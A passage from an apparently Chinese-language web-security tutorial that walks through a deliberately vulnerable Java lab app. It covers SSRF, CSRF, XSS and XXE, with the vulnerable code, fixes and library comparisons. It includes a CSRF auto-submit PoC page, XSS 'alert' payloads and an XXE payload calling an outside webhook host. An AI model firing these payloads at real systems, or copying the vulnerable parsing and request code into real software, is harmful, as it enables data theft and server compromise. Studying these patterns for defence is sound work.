+</code></pre><button class="code-block-unfold-btn"></button></div><p><code>httpClient</code>函数：</p><div class="language-java"><button title="Copy code" class="copy"></button><span class="lang">java</span><pre><code class="language-java">public static String httpClient(String url) {
+
+        StringBuilder result = new StringBuilder();
+
+        try {
+
+            CloseableHttpClient client = HttpClients.createDefault();
+            HttpGet httpGet = new HttpGet(url);
+            // set redirect enable false
+            // httpGet.setConfig(RequestConfig.custom().setRedirectsEnabled(false).build());
+            HttpResponse httpResponse = client.execute(httpGet); // send request
+            BufferedReader rd = new BufferedReader(new InputStreamReader(httpResponse.getEntity().getContent()));
+
+            String line;
+            while ((line = rd.readLine()) != null) {
+                result.append(line);
+            }
+
+            return result.toString();
+
+        } catch (Exception e) {
+            return e.getMessage();
+        }
+    }
+
+</code></pre><button class="code-block-unfold-btn"></button></div><p>方法3：</p><div class="language-java"><button title="Copy code" class="copy"></button><span class="lang">java</span><pre><code class="language-java">@GetMapping(&quot;/commonsHttpClient/sec&quot;)
+public String commonsHttpClient(@RequestParam String url) {
+
+    try {
+        SecurityUtil.startSSRFHook();
+        return HttpUtils.commonHttpClient(url);
+    } catch (SSRFException | IOException e) {
+        return e.getMessage();
+    } finally {
+        SecurityUtil.stopSSRFHook();
+    }
+
+}
+
+</code></pre><button class="code-block-unfold-btn"></button></div><p><code>commonHttpClient</code>函数：</p><div class="language-java"><button title="Copy code" class="copy"></button><span class="lang">java</span><pre><code class="language-java">    public static String commonHttpClient(String url) {
+
+        HttpClient client = new HttpClient();
+        GetMethod method = new GetMethod(url);
+
+        try {
+            client.executeMethod(method); // send request
+            byte[] resBody = method.getResponseBody();
+            return new String(resBody);
+
+        } catch (IOException e) {
+            return &quot;Error: &quot; + e.getMessage();
+        } finally {
+            // Release the connection.
+            method.releaseConnection();
+        }
+    }
+
+</code></pre><button class="code-block-unfold-btn"></button></div><p>方法4：</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>    @GetMapping(&quot;/Jsoup/sec&quot;)
+    public String Jsoup(@RequestParam String url) {
+
+        try {
+            SecurityUtil.startSSRFHook();
+            return HttpUtils.Jsoup(url);
+        } catch (SSRFException | IOException e) {
+            return e.getMessage();
+        } finally {
+            SecurityUtil.stopSSRFHook();
+        }
+
+    }
+
+</code></pre><button class="code-block-unfold-btn"></button></div><p>Jsoup函数</p><div class="language-java"><button title="Copy code" class="copy"></button><span class="lang">java</span><pre><code class="language-java">   public static String Jsoup(String url) {
+        try {
+            Document doc = Jsoup.connect(url)
+//                    .followRedirects(false)
+                    .timeout(3000)
+                    .cookie(&quot;name&quot;, &quot;joychou&quot;) // request cookies
+                    .execute().parse();
+            return doc.outerHtml();
+        } catch (IOException e) {
+            return e.getMessage();
+        }
+    }
+
+</code></pre><button class="code-block-unfold-btn"></button></div><p>方法5：</p><div class="language-java"><button title="Copy code" class="copy"></button><span class="lang">java</span><pre><code class="language-java">  @GetMapping(&quot;/IOUtils/sec&quot;)
+    public String IOUtils(String url) {
+        try {
+            SecurityUtil.startSSRFHook();
+            HttpUtils.IOUtils(url);
+        } catch (SSRFException | IOException e) {
+            return e.getMessage();
+        } finally {
+            SecurityUtil.stopSSRFHook();
+        }
+
+        return &quot;IOUtils ssrf test&quot;;
+    }
+
+</code></pre><button class="code-block-unfold-btn"></button></div><p><code>IOUtils</code>函数</p><div class="language-java"><button title="Copy code" class="copy"></button><span class="lang">java</span><pre><code class="language-java">  public static void IOUtils(String url) {
+        try {
+            IOUtils.toByteArray(URI.create(url));
+        } catch (IOException e) {
+            logger.error(e.getMessage());
+        }
+    }
+
+</code></pre><button class="code-block-unfold-btn"></button></div><table><thead><tr><th>特性/框架</th><th><strong>OkHttp</strong></th><th><strong>Apache HttpClient 4.x</strong></th><th><strong>Commons HttpClient 3.x</strong></th><th><strong>Jsoup</strong></th><th><strong>IOUtils + URLConnection</strong></th></tr></thead><tbody><tr><td><strong>主要定位</strong></td><td>现代高性能 HTTP 客户端</td><td>企业常用 HTTP 客户端</td><td>老版本 HTTP 客户端（已废弃）</td><td>网页抓取 + HTML 解析</td><td>简单流读取工具</td></tr><tr><td><strong>支持协议</strong></td><td>HTTP/HTTPS（默认拒绝 file://）</td><td>HTTP/HTTPS（默认拒绝 file://）</td><td>HTTP/HTTPS（部分场景支持 file://）</td><td>HTTP/HTTPS/FILE</td><td>HTTP/HTTPS/FILE/GOPHER 等</td></tr><tr><td><strong>是否跟随重定向</strong></td><td>✅ 默认跟随，可禁用</td><td>✅ 默认跟随，可禁用</td><td>✅ 默认跟随，可禁用</td><td>✅ 默认跟随</td><td>✅ 默认跟随</td></tr><tr><td><strong>连接池</strong></td><td>✅ 内置复用连接池</td><td>✅ 可配置连接池</td><td>❌ 无</td><td>❌ 无</td><td>❌ 每次新建连接</td></tr><tr><td><strong>超时设置</strong></td><td>✅ 支持连接/读超时</td><td>✅ 支持连接/读超时</td><td>❌ 配置复杂，易忽略</td><td>✅ 可配置超时</td><td>❌ 默认无限等待</td></tr><tr><td><strong>HTTP/2 支持</strong></td><td>✅ 支持</td><td>❌ 不支持（需额外模块）</td><td>❌ 不支持</td><td>❌ 不支持</td><td>❌ 不支持</td></tr><tr><td><strong>API 复杂度</strong></td><td>简单，链式调用</td><td>相对复杂，配置灵活</td><td>老旧 API，繁琐</td><td>最简单</td><td>最原始</td></tr><tr><td><strong>维护情况</strong></td><td>活跃（Square 维护）</td><td>活跃（Apache 维护）</td><td>❌ 已停止维护</td><td>活跃（Jsoup 团队）</td><td>JDK 自带，无新特性</td></tr><tr><td><strong>SSRF 风险</strong></td><td><strong>低</strong>（默认禁止 file://）</td><td><strong>低</strong>（默认禁止 file://）</td><td>中（可能支持 file://）</td><td><strong>高</strong>（默认支持 file://）</td><td><strong>高</strong>（支持 file://、gopher://）</td></tr><tr><td><strong>适用场景</strong></td><td>通用 HTTP 请求、API 调用、移动端</td><td>企业后端、复杂 HTTP 请求</td><td>维护遗留系统</td><td>爬虫、HTML 解析</td><td>小工具快速读取流</td></tr><tr><td><strong>是否推荐新项目使用</strong></td><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><p><strong>总结</strong></p><ul><li><strong>OkHttp</strong> 是一个现代且灵活的 HTTP 客户端，性能好，适用于大多数 HTTP 通信任务。</li><li><strong>HttpClient</strong> 更适合复杂的 HTTP 通信场景，有较强的功能支持，如认证、重定向等，但相对复杂，适合大型项目。</li><li><strong>CommonHttpClient</strong> 已经过时，主要用于老项目的兼容，不推荐在新项目中使用。</li><li><strong>Jsoup</strong> 适合处理 HTML 解析任务和轻量的 HTTP 请求，专注于网页抓取和数据提取。</li><li><strong>IOUtils</strong> 则是一个简化的工具，主要用于读取 URL 内容并转换为字节流，适合简单的小数据传输。</li></ul><p>（4）核心SSRF防护代码</p><p>修复代码：</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>public class SocketHook {
+
+    public static void startHook() throws IOException {
+        SocketHookFactory.initSocket();
+        SocketHookFactory.setHook(true);
+        try{
+            Socket.setSocketImplFactory(new SocketHookFactory());
+        }catch (SocketException ignored){
+        }
+    }
+
+    public static void stopHook(){
+        SocketHookFactory.setHook(false);
+    }
+}
+java复制代码123456789101112131415
+</code></pre><button class="code-block-unfold-btn"></button></div><p><strong>功能分析</strong>：</p><ul><li><p><code>startHook()</code></p><p>:</p><ul><li>启动 <code>SocketHook</code>，对所有新创建的 <code>Socket</code> 应用自定义行为。核心是通过 <code>Socket.setSocketImplFactory()</code> 来设置一个新的 <code>Socket</code> 工厂。</li><li>可能用于在 <code>Socket</code> 连接期间监控、修改、或审查数据流量。</li></ul></li><li><p><code>stopHook()</code></p><p>:</p><ul><li>关闭 <code>SocketHook</code>，将 <code>SocketHookFactory</code> 中的钩子状态关闭，停止对新 <code>Socket</code> 实例的自定义行为。</li></ul></li></ul><p><strong>应用场景</strong>：</p><ul><li><strong>安全防护</strong>：可以用来检测、拦截或修改特定的网络连接，防止攻击（如 SSRF、RFI 等）通过不受控制的网络请求滥用服务器资源。</li><li><strong>网络审计</strong>：可用于监控网络流量，以记录或分析 <code>Socket</code> 通信内容。</li><li><strong>调试/测试</strong>：在调试或测试环境中，使用钩子来捕获和分析网络通信行为。</li></ul><h3 id="csrf" tabindex="-1">CSRF <a class="header-anchor" href="#csrf" aria-label="Permalink to &quot;CSRF&quot;">​</a></h3><p>原理：</p><p>CSRF (Cross-site request forgery，跨站请求伪造)也被称为One Click Attack或者Session Riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。尽管听起来像跨站脚本(XSS)，但它与XSS非常不同，XSS利用站点内的信任用户，而CSRF则通过伪装成受信任用户请求受信任的网站。</p><p>简单的说，是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己以前认证过的站点并运行一些操作（如发邮件，发消息，甚至财产操作（如转账和购买商品））。因为浏览器之前认证过，所以被访问的站点会觉得这是真正的用户操作而去运行。</p><p><strong>攻击流程：</strong></p><ol><li>用户在浏览器中登录了受信任的网站（如银行网站），并且拥有有效的会话。</li><li>攻击者创建了一个恶意网站，嵌入了向受信任网站发送请求的代码。</li><li>用户在登录受信任网站后，访问了攻击者的恶意网站，恶意网站在用户不知情的情况下，自动向受信任网站发送请求（如转账请求）。</li><li>受信任的网站无法区分该请求是用户发起的还是攻击者伪造的，因此会执行这个请求</li></ol><h4 id="_1-csrf-post" tabindex="-1">1./csrf/post <a class="header-anchor" href="#_1-csrf-post" aria-label="Permalink to &quot;1./csrf/post&quot;">​</a></h4><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>@Controller
+@RequestMapping(&quot;/csrf&quot;)
+public class CSRF {
+
+    @GetMapping(&quot;/&quot;)
+    public String index() {
+        return &quot;form&quot;;
+    }
+
+    @PostMapping(&quot;/post&quot;)
+    @ResponseBody
+    public String post() {
+        return &quot;CSRF passed.&quot;;
+    }
+}
+
+</code></pre><button class="code-block-unfold-btn"></button></div><p>我们来看前端</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>
+&lt;html xmlns:th=&quot;http://www.thymeleaf.org&quot; lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;script th:src=&quot;@{https://code.jquery.com/jquery-3.4.1.min.js}&quot;&gt;&lt;/script&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+
+&lt;div&gt;
+    &lt;!-- th:action with Spring 3.2+ and Thymeleaf 2.1+ can automatically force Thymeleaf to include the CSRF token as a hidden field --&gt;
+    &lt;!-- &lt;form name=&quot;f&quot; th:action=&quot;@{/csrf/post}&quot; method=&quot;post&quot;&gt; --&gt;
+    &lt;form name=&quot;f&quot; action=&quot;/csrf/post&quot; method=&quot;post&quot;&gt;
+        &lt;input type=&quot;text&quot; name=&quot;input&quot; /&gt;
+        &lt;input type=&quot;submit&quot; value=&quot;Submit&quot; /&gt;
+        &lt;input type=&quot;hidden&quot; th:name=&quot;${_csrf.parameterName}&quot; th:value=&quot;${_csrf.token}&quot; /&gt;
+    &lt;/form&gt;
+&lt;/div&gt;
+
+&lt;/body&gt;
+
+&lt;/html&gt;
+
+</code></pre><button class="code-block-unfold-btn"></button></div><p>该代码存在csrf漏洞，漏洞验证poc：</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;CSRF Exploit&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;h1&gt;Simulating CSRF Attack&lt;/h1&gt;
+
+    &lt;form id=&quot;csrfForm&quot; action=&quot;http://127.0.0.1:8080/csrf/post&quot; method=&quot;POST&quot;&gt;
+        &lt;input type=&quot;hidden&quot; name=&quot;message&quot; value=&quot;This is a CSRF attack message&quot;&gt;
+    &lt;/form&gt;
+
+    &lt;script&gt;
+        // 自动提交表单，执行攻击
+        document.getElementById(&#39;csrfForm&#39;).submit();
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+</code></pre><button class="code-block-unfold-btn"></button></div><h4 id="csrf的防护" tabindex="-1">csrf的防护 <a class="header-anchor" href="#csrf的防护" aria-label="Permalink to &quot;csrf的防护&quot;">​</a></h4><ol><li>使用CSRF Token</li></ol><p>在每个表单或请求中，加入一个随机生成的token，并将其与服务器端的token进行对比。这个token通常存储在用户的session中，每次请求时都要携带这个token，防止外部网站伪造请求。</p><ul><li>在HTML表单中加入一个隐藏的input字段来传递CSRF token。</li><li>在服务器端验证请求中的token是否与存储的一致。</li></ul><ol start="2"><li>Referer Header 检查</li></ol><p>检查请求中的<code>Referer</code> header，确保请求来源是合法的站点。尽管这一方法并不完全可靠，因为有些浏览器可能会限制或不发送<code>Referer</code>，但它可以作为额外的安全措施。</p><ol start="3"><li>SameSite Cookie 属性</li></ol><p>使用<code>SameSite</code>属性设置cookies，限制跨站请求时是否可以发送cookie。<code>SameSite</code>有三个值：</p><ul><li><code>Strict</code>：完全禁止跨站请求携带cookie。</li><li><code>Lax</code>：只有部分跨站请求才携带cookie（例如从外部链接访问站点时）。</li><li><code>None</code>：允许跨站请求携带cookie，但必须设置<code>Secure</code>，即请求需要使用HTTPS。</li></ul><ol start="4"><li>HTTP 方法限制</li></ol><p>对于敏感操作，尽量使用<code>POST</code>、<code>PUT</code>、<code>DELETE</code>等非GET方法，因为GET请求一般不带有请求体，容易被CSRF利用。并且可以通过在服务器端验证请求方法是否符合规范来增加安全性。</p><ol start="5"><li>验证码（CAPTCHA）</li></ol><p>在执行重要操作（如提交表单或修改敏感信息）时，加入验证码验证，确保操作是由真实用户执行，而不是自动化脚本。</p><ol start="6"><li>双重身份验证（2FA）</li></ol><p>结合身份验证措施，如短信验证码或应用生成的二次密码，在用户执行敏感操作时进一步确认其身份。</p><h3 id="xss" tabindex="-1">XSS <a class="header-anchor" href="#xss" aria-label="Permalink to &quot;XSS&quot;">​</a></h3><h4 id="_1-xss-reflect" tabindex="-1">1./xss/reflect <a class="header-anchor" href="#_1-xss-reflect" aria-label="Permalink to &quot;1./xss/reflect&quot;">​</a></h4><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>    @RequestMapping(&quot;/reflect&quot;)
+    @ResponseBody
+    public static String reflect(String xss) {
+        return xss;
+    }
+</code></pre><button class="code-block-unfold-btn"></button></div><p>反射型xss</p><p>利用</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>?xss=&lt;script&gt;alert(1)&lt;/script&gt;
+</code></pre><button class="code-block-unfold-btn"></button></div><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507251640728.png" alt="image-20250725164023603" loading="lazy" decoding="async"></figure><h4 id="_2-xss-stored" tabindex="-1">2./xss/stored <a class="header-anchor" href="#_2-xss-stored" aria-label="Permalink to &quot;2./xss/stored&quot;">​</a></h4><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code> @RequestMapping(&quot;/stored/store&quot;)
+    @ResponseBody
+    public String store(String xss, HttpServletResponse response) {
+        Cookie cookie = new Cookie(&quot;xss&quot;, xss);
+        response.addCookie(cookie);
+        return &quot;Set param into cookie&quot;;
+    }
+
+    /**
+     * Vul Code.
+     * StoredXSS Step2
+     * http://localhost:8080/xss/stored/show
+     *
+     * @param xss unescape string
+     */
+    @RequestMapping(&quot;/stored/show&quot;)
+    @ResponseBody
+    public String show(@CookieValue(&quot;xss&quot;) String xss) {
+        return xss;
+    }
+
+</code></pre><button class="code-block-unfold-btn"></button></div><p>存储型xss，我们先在/stored/store路由存入Cookie</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>?xss=&lt;script&gt;alert(1)&lt;/script&gt;
+</code></pre><button class="code-block-unfold-btn"></button></div><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507251643828.png" alt="image-20250725164345723" loading="lazy" decoding="async"></figure><p>然后在/stored/show路由攻击</p><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507251644303.png" alt="image-20250725164425228" loading="lazy" decoding="async"></figure><h4 id="xss防护" tabindex="-1">xss防护 <a class="header-anchor" href="#xss防护" aria-label="Permalink to &quot;xss防护&quot;">​</a></h4><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code> /**
+     * safe Code.
+     * http://localhost:8080/xss/safe
+     */
+    @RequestMapping(&quot;/safe&quot;)
+    @ResponseBody
+    public static String safe(String xss) {
+        return encode(xss);
+    }
+
+    private static String encode(String origin) {
+        origin = StringUtils.replace(origin, &quot;&amp;&quot;, &quot;&amp;amp;&quot;);
+        origin = StringUtils.replace(origin, &quot;&lt;&quot;, &quot;&amp;lt;&quot;);
+        origin = StringUtils.replace(origin, &quot;&gt;&quot;, &quot;&amp;gt;&quot;);
+        origin = StringUtils.replace(origin, &quot;\&quot;&quot;, &quot;&amp;quot;&quot;);
+        origin = StringUtils.replace(origin, &quot;&#39;&quot;, &quot;&amp;#x27;&quot;);
+        origin = StringUtils.replace(origin, &quot;/&quot;, &quot;&amp;#x2F;&quot;);
+        return origin;
+    }
+}
+
+</code></pre><button class="code-block-unfold-btn"></button></div><p>把需要的字符都过滤了基本就防完了xss攻击</p><h3 id="xxe" tabindex="-1">XXE <a class="header-anchor" href="#xxe" aria-label="Permalink to &quot;XXE&quot;">​</a></h3><h4 id="_1-xxe-xmlreader-vuln" tabindex="-1">1./xxe/xmlReader/vuln <a class="header-anchor" href="#_1-xxe-xmlreader-vuln" aria-label="Permalink to &quot;1./xxe/xmlReader/vuln&quot;">​</a></h4><div class="language-java"><button title="Copy code" class="copy"></button><span class="lang">java</span><pre><code class="language-java">    @PostMapping(&quot;/xmlReader/vuln&quot;)
+    public String xmlReaderVuln(HttpServletRequest request) {
+        try {
+            String body = WebUtils.getRequestBody(request);
+            logger.info(body);
+            XMLReader xmlReader = XMLReaderFactory.createXMLReader();
+            xmlReader.parse(new InputSource(new StringReader(body)));  // parse xml
+            return &quot;xmlReader xxe vuln code&quot;;
+        } catch (Exception e) {
+            logger.error(e.toString());
+            return EXCEPT;
+        }
+    }
+</code></pre><button class="code-block-unfold-btn"></button></div><h4 id="_2-xxe-saxbuilder-vuln" tabindex="-1">2./xxe/SAXBuilder/vuln <a class="header-anchor" href="#_2-xxe-saxbuilder-vuln" aria-label="Permalink to &quot;2./xxe/SAXBuilder/vuln&quot;">​</a></h4><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>@RequestMapping(value = &quot;/SAXBuilder/vuln&quot;, method = RequestMethod.POST)
+    public String SAXBuilderVuln(HttpServletRequest request) {
+        try {
+            String body = WebUtils.getRequestBody(request);
+            logger.info(body);
+
+            SAXBuilder builder = new SAXBuilder();
+            // org.jdom2.Document document
+            builder.build(new InputSource(new StringReader(body)));  // cause xxe
+            return &quot;SAXBuilder xxe vuln code&quot;;
+        } catch (Exception e) {
+            logger.error(e.toString());
+            return EXCEPT;
+        }
+    }
+</code></pre><button class="code-block-unfold-btn"></button></div><p>换用SAXReader第三方库，攻击手法同上（注意请求要以http格式进行解析）：</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE test [&lt;!ENTITY xxe SYSTEM &quot;http://webhook.site/186f2ce9-cf0c-4eda-ad3f-49c3873814a7&quot;&gt;]&gt;&lt;root&gt;&amp;xxe;&lt;/root&gt;
+
+</code></pre><button class="code-block-unfold-btn"></button></div><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507251712331.png" alt="image-20250725171230237" loading="lazy" decoding="async"></figure><h4 id="修复代码" tabindex="-1">修复代码 <a class="header-anchor" href="#修复代码" aria-label="Permalink to &quot;修复代码&quot;">​</a></h4><p>通过<code>setFeature</code>关闭DTD和外部实体解析从而防止了xxe</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>    @RequestMapping(value = &quot;/xmlReader/sec&quot;, method = RequestMethod.POST)
+    public String xmlReaderSec(HttpServletRequest request) {
+        try {
+            String body = WebUtils.getRequestBody(request);
+            logger.info(body);
+
+            XMLReader xmlReader = XMLReaderFactory.createXMLReader();
+            // fix code start
+            xmlReader.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);
+            xmlReader.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);
+            xmlReader.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);
+            //fix code end
+            xmlReader.parse(new InputSource(new StringReader(body)));  // parse xml
+
+        } catch (Exception e) {
+            logger.error(e.toString());
+            return EXCEPT;
+        }
+
+        return &quot;xmlReader xxe security code&quot;;
+    }
+</code></pre><button class="code-block-unfold-btn"></button></div><h4 id="_3-xxe-saxreader-vuln" tabindex="-1">3./xxe/SAXReader/vuln <a class="header-anchor" href="#_3-xxe-saxreader-vuln" aria-label="Permalink to &quot;3./xxe/SAXReader/vuln&quot;">​</a></h4><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>@RequestMapping(value = &quot;/SAXReader/vuln&quot;, method = RequestMethod.POST)
+    public String SAXReaderVuln(HttpServletRequest request) {
+        try {
+            String body = WebUtils.getRequestBody(request);
+            logger.info(body);
+
+            SAXReader reader = new SAXReader();
+            // org.dom4j.Document document
+            reader.read(new InputSource(new StringReader(body))); // cause xxe
+
+        } catch (Exception e) {
+            logger.error(e.toString());
+            return EXCEPT;
+        }
+
+        return &quot;SAXReader xxe vuln code&quot;;
+    }
+
+</code></pre><button class="code-block-unfold-btn"></button></div><p>和前两个的payload一样但区别是这个有回显</p><h4 id="_4-xxe-saxparser-vuln" tabindex="-1">4./xxe/SAXParser/vuln <a class="header-anchor" href="#_4-xxe-saxparser-vuln" aria-label="Permalink to &quot;4./xxe/SAXParser/vuln&quot;">​</a></h4><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>  @RequestMapping(value = &quot;/SAXParser/vuln&quot;, method = RequestMethod.POST)
+    public String SAXParserVuln(HttpServletRequest request) {
+        try {
+            String body = WebUtils.getRequestBody(request);
+            logger.info(body);
+
+            SAXParserFactory spf = SAXParserFactory.newInstance();
+            SAXParser parser = spf.newSAXParser();
+            parser.parse(new InputSource(new StringReader(body)), new DefaultHandler());  // parse xml
+
+            return &quot;SAXParser xxe vuln code&quot;;
+        } catch (Exception e) {
+            logger.error(e.toString());
+            return EXCEPT;
+        }
+    }
+
+</code></pre><button class="code-block-unfold-btn"></button></div><h4 id="_5-xxe-digester-vuln" tabindex="-1">5./xxe/Digester/vuln <a class="header-anchor" href="#_5-xxe-digester-vuln" aria-label="Permalink to &quot;5./xxe/Digester/vuln&quot;">​</a></h4><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>@RequestMapping(value = &quot;/Digester/vuln&quot;, method = RequestMethod.POST)
+    public String DigesterVuln(HttpServletRequest request) {
+        try {
+            String body = WebUtils.getRequestBody(request);
+            logger.info(body);
+
+            Digester digester = new Digester();
+            digester.parse(new StringReader(body));  // parse xml
+        } catch (Exception e) {
+            logger.error(e.toString());
+            return EXCEPT;
+        }
+        return &quot;Digester xxe vuln code&quot;;
+    }
+
+</code></pre><button class="code-block-unfold-btn"></button></div><h4 id="_6-xxe-documentbuilder-vuln" tabindex="-1">6./xxe/DocumentBuilder/vuln <a class="header-anchor" href="#_6-xxe-documentbuilder-vuln" aria-label="Permalink to &quot;6./xxe/DocumentBuilder/vuln&quot;">​</a></h4><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>@RequestMapping(value = &quot;/DocumentBuilder/vuln&quot;, method = RequestMethod.POST)
+    public String DocumentBuilderVuln(HttpServletRequest request) {
+        try {
+            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
+            DocumentBuilder db = dbf.newDocumentBuilder();
+            InputSource is = new InputSource(request.getInputStream());
+            Document document = db.parse(is);  // parse xml
+
+            // 遍历xml节点name和value
+            StringBuilder buf = new StringBuilder();
+            NodeList rootNodeList = document.getChildNodes();
+            for (int i = 0; i &lt; rootNodeList.getLength(); i++) {
+                Node rootNode = rootNodeList.item(i);
+                NodeList child = rootNode.getChildNodes();
+                for (int j = 0; j &lt; child.getLength(); j++) {
+                    Node node = child.item(j);
+                    buf.append(String.format(&quot;%s: %s\n&quot;, node.getNodeName(), node.getTextContent()));
+                }
+            }
+            return buf.toString();
+        } catch (Exception e) {
+            e.printStackTrace();
+            logger.error(e.toString());
+            return e.toString();
+        }
+    }
+
+</code></pre><button class="code-block-unfold-btn"></button></div><p>这是JDK自带的类，以此产生的XXE是存在回显的</p><h4 id="_7-xxe-documentbuilder-xinclude-vuln" tabindex="-1">7./xxe/DocumentBuilder/xinclude/vuln <a class="header-anchor" href="#_7-xxe-documentbuilder-xinclude-vuln" aria-label="Permalink to &quot;7./xxe/DocumentBuilder/xinclude/vuln&quot;">​</a></h4><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>@RequestMapping(value = &quot;/DocumentBuilder/xinclude/vuln&quot;, method = RequestMethod.POST)
+    public String DocumentBuilderXincludeVuln(HttpServletRequest request) {
+        try {
+            String body = WebUtils.getRequestBody(request);
+            logger.info(body);
+
+            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
+            dbf.setXIncludeAware(true);   // 支持XInclude
+            dbf.setNamespaceAware(true);  // 支持XInclude
+            DocumentBuilder db = dbf.newDocumentBuilder();
+            StringReader sr = new StringReader(body);
+            InputSource is = new InputSource(sr);
+            Document document = db.parse(is);  // parse xml
+
+            NodeList rootNodeList = document.getChildNodes();
+            response(rootNodeList);
+
+            sr.close();
+            return &quot;DocumentBuilder xinclude xxe vuln code&quot;;
+        } catch (Exception e) {
+            logger.error(e.toString());
+            return EXCEPT;
+        }
+    }
+
+</code></pre><button class="code-block-unfold-btn"></button></div><h4 id="_8-xxe-xmlreader-vuln" tabindex="-1">8./xxe/XMLReader/vuln <a class="header-anchor" href="#_8-xxe-xmlreader-vuln" aria-label="Permalink to &quot;8./xxe/XMLReader/vuln&quot;">​</a></h4><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>@PostMapping(&quot;/XMLReader/vuln&quot;)
+    public String XMLReaderVuln(HttpServletRequest request) {
+        try {
+            String body = WebUtils.getRequestBody(request);
+            logger.info(body);
+
+            SAXParserFactory spf = SAXParserFactory.newInstance();
+            SAXParser saxParser = spf.newSAXParser();
+            XMLReader xmlReader = saxParser.getXMLReader();
+            xmlReader.parse(new InputSource(new StringReader(body)));
+
+        } catch (Exception e) {
+            logger.error(e.toString());
+            return EXCEPT;
+        }
+
+        return &quot;XMLReader xxe vuln code&quot;;
+    }
+
+</code></pre><button class="code-block-unfold-btn"></button></div><h4 id="_9-xxe-documenthelper-vuln" tabindex="-1">9./xxe/DocumentHelper/vuln <a class="header-anchor" href="#_9-xxe-documenthelper-vuln" aria-label="Permalink to &quot;9./xxe/DocumentHelper/vuln&quot;">​</a></h4><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>@PostMapping(&quot;/DocumentHelper/vuln&quot;)
+    public String DocumentHelper(HttpServletRequest req) {
+        try {
+            String body = WebUtils.getRequestBody(req);
+            DocumentHelper.parseText(body); // parse xml
+        } catch (Exception e) {
+            logger.error(e.toString());
+            return EXCEPT;
+        }
+
+        return &quot;DocumentHelper xxe vuln code&quot;;
+    }
+
+    private static void response(NodeList rootNodeList){
+        for (int i = 0; i &lt; rootNodeList.getLength(); i++) {
+            Node rootNode = rootNodeList.item(i);
+            NodeList xxe = rootNode.getChildNodes();
+            for (int j = 0; j &lt; xxe.getLength(); j++) {
+                Node xxeNode = xxe.item(j);
+                // 测试不能blind xxe，所以强行加了一个回显
+                logger.info(&quot;xxeNode: &quot; + xxeNode.getNodeValue());
+            }
+
+        }
+    }
+
+</code></pre><button class="code-block-unfold-btn"></button></div><p>修复该漏洞只需升级dom4j到2.1.1及以上，该版本及以上禁用了ENTITY；不带ENTITY的PoC不能利用，所以禁用ENTITY即可完成修复。</p><h4 id="上述存在xxe漏洞库对比" tabindex="-1">上述存在XXE漏洞库对比 <a class="header-anchor" href="#上述存在xxe漏洞库对比" aria-label="Permalink to &quot;上述存在XXE漏洞库对比&quot;">​</a></h4><table><thead><tr><th style="text-align:left;"><strong>工具/类</strong></th><th style="text-align:left;"><strong>简介</strong></th><th style="text-align:left;"><strong>使用场景</strong></th><th style="text-align:left;"><strong>优点</strong></th><th style="text-align:left;"><strong>缺点</strong></th></tr></thead><tbody><tr><td style="text-align:left;"><code>xmlReader</code></td><td style="text-align:left;">SAX 的接口，基于事件驱动的解析</td><td style="text-align:left;">处理大型 XML 文件</td><td style="text-align:left;">内存占用小，速度快</td><td style="text-align:left;">需要手动管理上下文，处理复杂结构困</td></tr><tr><td style="text-align:left;"><code>SAXBuilder</code></td><td style="text-align:left;">JDOM 中基于 SAX 的解析器</td><td style="text-align:left;">需要用 JDOM 处理 XML 数据时</td><td style="text-align:left;">结合了 SAX 的高效性和 JDOM 的易用性</td><td style="text-align:left;">解析速度依赖于 SAX，灵活性低于 DOM</td></tr><tr><td style="text-align:left;">SAXReader`</td><td style="text-align:left;">Dom4j 中基于 SAX 的解析器</td><td style="text-align:left;">需要 Dom4j 进行 XML 操作时</td><td style="text-align:left;">高效且灵活，支持树结构</td><td style="text-align:left;">性能略逊于纯 SAX</td></tr><tr><td style="text-align:left;"><code>SAXParser</code></td><td style="text-align:left;">Java 中的 SAX 解析器</td><td 